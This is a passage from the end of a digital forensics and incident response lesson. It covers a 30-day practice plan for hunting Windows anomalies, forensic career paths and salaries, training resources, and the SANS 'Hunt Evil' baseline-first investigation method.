spreadsheet)\n\n**Week 4: Hunt for Anomalies**\n- [ ] Look for processes with unusual parents\n- [ ] Check for scheduled tasks you didn't create\n- [ ] Review PowerShell execution logs (Event ID 4104)\n- [ ] Identify at least ONE unusual finding (even if benign)\n\n**By Day 30**: You'll have hands-on experience with every artifact covered in this lesson.\n\n**Share your findings**: Post on LinkedIn, write a blog, or present to your team. Teaching others reinforces your learning.\n\n### Career Paths: Where Forensic Skills Take You\n\n**With forensic investigation expertise, you're qualified for**:\n\n🔍 **Digital Forensics Analyst** ($70k - $120k)\n- Analyze disk images, memory dumps, and artifacts\n- Support incident response investigations\n- Provide forensic reports for legal proceedings\n\n🔍 **Incident Responder** ($90k - $150k)\n- Respond to active breaches\n- Contain threats and eradicate attackers\n- Conduct post-incident forensics\n\n🔍 **Threat Hunter** ($90k - $150k)\n- Proactively hunt for threats using forensic artifacts\n- Build detection rules from hunt findings\n- Mentor junior analysts\n\n🔍 **Senior Forensic Investigator** ($120k - $180k)\n- Lead complex investigations\n- Provide expert testimony\n- Develop forensic methodologies\n\n🔍 **Forensic Consultant** ($150k - $250k+)\n- Work for top firms (Mandiant, CrowdStrike, KPMG)\n- Respond to high-profile breaches\n- Support nation-state APT investigations\n\n🔍 **DFIR Team Lead / Manager** ($140k - $200k+)\n- Manage forensics and incident response teams\n- Design IR playbooks and procedures\n- Interface with executives and legal teams\n\n**Salary ranges are US-based estimates (2024). Remote roles increasingly available.**\n\n**Key insight**: Forensic skills are **foundational** for many cybersecurity roles. Even if you don't become a full-time forensic analyst, these skills make you a better threat hunter, incident responder, and security engineer.\n\n### Resources to Deepen Your Skills\n\n**SANS Courses** (Gold Standard):\n- **FOR508**: Advanced Incident Response, Threat Hunting & Digital Forensics (GCFA cert)\n- **FOR500**: Windows Forensic Analysis (GCFE cert)\n- **FOR572**: Advanced Network Forensics (GNFA cert)\n\n**Free Tools** (Eric Zimmerman's Suite):\n- **PECmd**: Prefetch parser\n- **AmcacheParser**: AmCache.hve parser\n- **RegistryExplorer**: Registry hive analysis\n- **Timeline Explorer**: Timeline visualization\n- Download: https://ericzimmerman.github.io/\n\n**Books**:\n- *\"Windows Forensic Analysis\" by Harlan Carvey*\n- *\"The Art of Memory Forensics\" by Ligh, Case, Levy, Walters*\n- *\"File System Forensic Analysis\" by Brian Carrier*\n\n**Practice Environments**:\n- **SANS DFIR NetWars**: Forensic CTF competitions\n- **CyberDefenders**: Free forensic challenges (https://cyberdefenders.org)\n- **MemLabs**: Memory forensics CTF (https://github.com/stuxnet999/MemLabs)\n\n**Communities**:\n- **SANS DFIR Summit**: Annual conference\n- **r/computerforensics**: Reddit community\n- **DFIR Discord**: Active practitioner community\n- **LinkedIn DFIR Groups**: Job opportunities, best practices\n\n### The SANS Hunt Evil Philosophy: Know Normal, Find Evil\n\n**This lesson is built on a simple but powerful principle**:\n\n> \"You can't find evil if you don't know normal.\"\n\n**Most security analysts skip the baseline step**:\n- They jump straight to hunting for IOCs (Indicators of Compromise)\n- They search for \"evil.exe\" or \"192.168.1.1\"\n- They rely on alerts from tools\n\n**But elite forensic investigators START with baselines**:\n- What processes should be running?\n- What user behavior is normal?\n- What network traffic is expected?\n\n**Then they hunt for OUTLIERS**:\n- Process with wrong parent? Investigate.\n- User accessing systems they never touch? Investigate.\n- Network traffic to unknown country? Investigate.\n\n**This is the Hunt Evil mindset**: Baseline → Outliers → Investigation → Detection\n\n**Commit to this approach** in your daily work:\n1. **Document normal** (baseline your environment)\n2. **Hunt for abnormal** (deviations from baseline)\n3. **Investigate findings** (correlate artifacts, build timelines)\n4. **Build detections** (turn manual hunts into automated alerts)\n5. **Repeat** (baselines change, hunts evolve)\n\n### A Personal Note: You're Part of the Defense\n\n**Forensic investigation is not just technical analysis. It's storytelling.**\n\nWhen you build a forensic timeline, you're reconstructing the **story of what happened**:\n- Who was the attacker?\n- When did they get in?\n- What did they do?\n- How did they move?\n- Where is the evidence?\n\n**This story matters** because:\n- **Executives** need to understand the business impact\n- **Legal teams** need evidence for prosecution\n- **Insurance** needs proof for claims\n- **Customers** deserve transparency about breaches\n- **Your team** needs to learn and improve\n\n**You're not just analyzing logs and files. You're uncovering truth.**\n\n**The organizations you protect are under constant attack**:\n- Ransomware groups encrypting hospitals\n- Nation-state APTs stealing IP from companies\n- Cybercriminals stealing customer data\n\n**Without skilled forensic investigators**:\n- Breaches go undetected for months\n- Attackers cover their tracks\n- Organizations don't learn from incidents\n- The same attacks succeed again and again\n\n**With investigators like you**:\n- Breaches are detected early\n- Evidence is preserved\n- Attackers are identified\n- Defenses improve continuously\n\n**You're part of the solution.** Every timeline you build, every anomaly you detect, every incident you respond to makes the world more secure.\n\n**That's the impact you have.**\n\n### Final Challenge: Teach Someone\n\n**The best way to solidify your learning? Teach it to someone else.**\n\n**In the next 30 days, teach this lesson to a colleague**:\n\n**Option 1**: Give a 30-minute presentation\n- Explain Windows process baseline\n- Show lateral movement artifacts\n- Walk through a timeline\n\n**Option 2**: Write a blog post\n- \"How to Detect PsExec Lateral Movement\"\n- \"Building Forensic Timelines from Windows Artifacts\"\n- \"The SANS Hunt Evil Methodology Explained\"\n\n**Option 3**: Mentor a junior analyst\n- Walk them through a real investigation\n- Show them how to use forensic tools\n- Review their timeline analysis\n\n**Why this matters**: Teaching forces you to organize your knowledge, answer questions, and think deeply about concepts. You'll learn more from teaching than from any course.\n\n### You're Ready\n\n**You've completed one of the most practical lessons in this entire course.**\n\n**You now have**:\n- ✅ Framework for forensic investigation (Hunt Evil)\n- ✅ Knowledge of Windows process baselines\n- ✅ Lateral movement detection techniques\n- ✅ Artifact correlation methodology\n- ✅ Hands-on timeline building experience\n\n**The next breach you investigate**, you'll know:\n- Where to look (Event Logs, Registry, File System)\n- What to look for (process anomalies, lateral movement, persistence)\n- How to correlate (timeline analysis, multiple artifact sources)\n- What it means (normal vs malicious, attribution, scope)\n\n**The organizations you protect need you.**\n\n**Now go investigate.**\n\n---\n\n### Next Steps in Your DFIR Journey\n\n**Continue your learning with**:\n- **DFIR 09**: Memory Forensics and Malware Analysis\n- **DFIR 10**: Network Forensics and Packet Analysis\n- **Threat Hunting**: Apply forensic skills to proactive threat hunting\n\n**You've mastered forensic timeline investigation. Keep building on this foundation.**\n\n**Thank you for your dedication to learning.**\n\n**Thank you for defending the digital world.**\n\n**Now go Hunt Evil.**"
      }
    }
  ]
}